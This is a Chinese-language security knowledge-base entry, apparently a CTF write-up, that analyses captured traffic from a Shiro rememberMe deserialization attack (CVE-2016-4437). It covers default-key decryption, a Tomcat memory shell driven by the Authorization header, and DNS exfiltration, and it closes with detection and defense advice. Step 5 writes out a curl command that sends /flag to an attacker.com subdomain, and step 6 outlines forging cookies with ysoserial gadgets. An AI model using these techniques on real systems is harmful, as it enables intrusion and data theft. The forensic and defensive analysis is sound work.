---
id: web-java-framework-shiro-rememberme-pcap-memshell-dns-exfil
title: Shiro rememberMe 流量复盘：默认密钥解密、AbstractTranslet 内存马与 DNS 外带
type: scenario
domain: web
path: web/java/framework/shiro
technique: shiro-rememberme-pcap-memshell-dns-exfil
tags:
- java
- shiro
- rememberme
- deserialization
- memshell
- pcap
- dns-exfiltration
- aes-cbc
- cve-2016-4437
cve:
- CVE-2016-4437
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V202
  verified_at: '2026-11-07T02:13:06+08:00'
  notes: 已对照原文 ezShiro 与图 19-27 核对：rememberMe/Cookie 结构、默认密钥 kPH+bIxk5D2deZiIxcaaaA==、AbstractTranslet 内存马 Authorization Basic 命令与 $$$base64$$$ 回显、DNS base64→rot13→rev 外带一致；本地复算 DNS 链得 0xGame{Just_Sh1r0}；未复跑靶场。
url: /docs/web/java/framework/shiro/web-java-framework-shiro-rememberme-pcap-memshell-dns-exfil/
draft: false
kb_aliases:
- Shiro rememberMe 流量解密
- Shiro pcap 内存马分析
- AbstractTranslet Authorization 回显马
- Shiro DNS 外带
- rememberMe 默认密钥离线解密
---

## 一句话结论

抓包中出现很长的 `rememberMe` Cookie 时，可按 `base64(IV + AES-CBC(Java 序列化数据))` 用默认密钥 `kPH+bIxk5D2deZiIxcaaaA==` 离线解密；若明文是 `AbstractTranslet` 内存马，它会把 `Authorization: Basic base64(命令)` 当作命令、把 `$$$base64(回显)$$$` 写回响应，并通过把 `flag` 经 `rev → rot13 → base64` 后拼进 DNS 子域名实现无回显外带。

## 原理

- **Shiro rememberMe 的编码流程**：用户勾选“记住我”后，Shiro 将身份对象 Java 序列化，随后 AES-CBC 加密、Base64 编码，写入 `rememberMe` Cookie。Cookie 值结构为 `base64(IV + ciphertext)`，其中 IV 是 Base64 解码后的前 16 字节，密文是第 17 字节之后的内容。
- **离线解密**：只要能拿到 Cookie、密钥和 IV，就可以在本地复现服务端的 `Base64 解码 → AES-CBC 解密 → PKCS#7 去填充 → Java 反序列化` 流程。早期/默认部署使用固定密钥 `kPH+bIxk5D2deZiIxcaaaA==`，因此流量包可以直接解出反序列化字节流；即使密钥被改，也可先做字典爆破。
- **为什么 IV 不需要额外信息**：Shiro 的 `CookieRememberMeManager` 将随机 IV 放在密文前面一起 Base64，因此解密方从密文自身就能取得 IV；这与把 IV 单独存库的方案不同。
- **内存马行为**：反序列化链最终加载 `TemplatesImpl` 的 `_bytecodes`，其中类继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`。构造/静态初始化时它遍历当前线程组中的 HTTP 线程，反射取得 Tomcat 的 `Request/Response`；读到 `Host` 头就回 `200` 和 `Host` 作为连通性标记，读到 `Authorization` 头就 Base64 解码 `Basic` 后的内容并交给 `ProcessBuilder`（Windows 用 `cmd.exe /c`，其他用 `/bin/sh -c`）执行；命令输出用 `$$$...$$$` 包裹并再次 Base64，通过容器内部 `doWrite` 反射写回响应体。
- **DNS 外带**：当命令没有走 HTTP 回显、而是访问 `$(...)....attacker.com` 这类子域名时，解析请求会先到达 DNS 服务器；攻击者把数据编码进子域名标签，就能在只有 DNS 出网的场景下带出数据。本题的编码链是 `cat /flag → rev → rot13 → base64（去换行）`，抓包中 DNS 查询的 AAAA/A 记录前缀即为该 Base64 串；还原时反向执行 `base64 -d → rot13 → rev`。
- **为什么这些点能串起来**：Shiro 反序列化提供了代码执行入口；内存马把命令通道藏在 `Authorization` 头，避免依赖 Cookie 长度和固定回显；DNS 外带则在 HTTP 响应不可见或出网受限时提供第二条数据通道。

## 触发条件

- 目标使用 Apache Shiro，登录/会话流程出现 `rememberMe` Cookie；常见于 Shiro-550（CVE-2016-4437）或仍使用默认/弱密钥的部署。
- 已获得含 `rememberMe` 请求的 pcap，或能直接向目标发送 Cookie。
- 服务端 classpath 存在可利用的反序列化 gadget（如 CommonsBeanutils/CommonsCollections），或流量中已出现可加载 `TemplatesImpl` 的链。
- 分析内存马时，目标容器为 Tomcat 一类可通过线程组反射取到 Request/Response 的容器；DNS 外带则要求目标能解析外部域名。

## 利用步骤

1. 在 Wireshark 中过滤 HTTP 并追踪第一个流，定位 `Cookie: rememberMe=...`；复制完整的 Cookie 值。
2. Base64 解码 Cookie，取前 16 字节为 IV，其余为 AES 密文；用默认密钥做 AES-CBC 解密并去 PKCS#7 填充。若解出的不是 Java 序列化数据（魔数 `AC ED 00 05`），改用密钥字典爆破或检查是否 Shiro-721 的 CBC padding oracle 场景。
3. 用 `javaobj` 解析序列化对象，定位 `TemplatesImpl` 的 `_bytecodes`，把字节码写成 `.class`，用 CFR 反编译审计。重点看构造器/静态块：线程组遍历、`getHeader("Authorization")`、`ProcessBuilder`、`doWrite` 反射、`$$$` 包裹的 Base64 回显。
4. 从流量中的请求里提取 `Authorization: Basic ...`，Base64 解码得到实际命令；对照响应体中 `$$$...$$$` 的 Base64 内容还原回显。
5. 若命令是 `curl $(cat /flag | rev | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 | tr -d '\n').attacker.com`，在 DNS 查询记录中找出该子域名前缀，按 `base64 -d`、rot13、`rev` 的逆序还原 flag。
6. 需要主动利用时，用同一密钥重新加密 ysoserial/自研 gadget，按 `base64(IV + ciphertext)` 放回 Cookie；无回显时改用 URLDNS/JRMP 或 DNS 子域名通道。

## PoC

```python
import base64
from Crypto.Cipher import AES

cookie_b64 = "<rememberMe cookie>"
key_b64 = "kPH+bIxk5D2deZiIxcaaaA=="

raw = base64.b64decode(cookie_b64)
iv, ct = raw[:16], raw[16:]
key = base64.b64decode(key_b64)
pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
pad = pt[-1]
pt = pt[:-pad]
print(pt[:4].hex())   # 期望 aced0005，Java 序列化魔数
open("decrypted_result.bin", "wb").write(pt)
```

```bash
# 内存马回显/命令通道的实际形态
# 请求: Authorization: Basic <base64(cmd)>
echo 'd2hvYW1p' | base64 -d          # whoami
# 响应: $$$<base64(stdout)>$$$

# DNS 外带还原
echo 'fTBlMXVGX2dmaFd7cnpuVGswCg==' | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rev
```

说明：PoC 为原文流程的最小化复现，未在本机对靶场执行；原文通过在线 Shiro 解密工具和 `javaobj + CFR` 得到内存马源码，并从 DNS 查询还原出 flag。

## 变体与关联

- 变体（密钥）：默认密钥直接解密；密钥被修改时用字典爆破（ShiroAttack2 等）；Shiro-721 场景改用 CBC padding oracle 构造合法密文。
- 变体（回显）：`$$$base64$$$` 响应回显；无回显时用 URLDNS/JRMP；本题用 DNS 子域名外带。
- 变体（载荷）：`AbstractTranslet` 内存马；两段式 ShellLoader 从 POST 加载大体积类；TomcatEcho 取 Request。
- 关联：[[web-java-framework-shiro-550-hardcoded-key-deserialization]]（Shiro-550 原理与利用）；[[web-java-framework-shiro-721-padding-oracle]]；[[web-java-framework-shiro-rememberme-two-stage-memshell-loader]]（8KB 头限制与两段式加载）；[[ctf-forensics-http-c2-aes-init-png-text-command-channel]]（HTTP 命令通道取证）；[[ctf-forensics-soc-dns-tunnel-base32-pat-exfil]]（DNS 隧道取证）。
- 边界：流量中没有完整 Cookie、密钥不在字典、服务端禁用反序列化或 classpath 无 gadget 时，只能停留在识别层；DNS 外带要求解析请求被捕获且未被 DoH/加密 DNS 隐藏。

## 检测与防御

- 检测：`rememberMe` Cookie 长度异常（远超正常会话）、Cookie Base64 解码后以 `aced0005` 开头；请求中出现非业务接口的 `Authorization: Basic`；响应体出现 `$$$...$$$`；DNS 日志出现高熵随机标签子域名和短周期查询。
- 防御：升级 Shiro 并移除默认密钥、使用随机密钥并妥善保管；关闭不必要的 rememberMe；限制反序列化白名单；对 `Authorization` 头做统一鉴权并拒绝未知 Basic 凭据；出网做 DNS 白名单/日志审计；容器最小权限运行，禁止应用进程直接执行 shell。
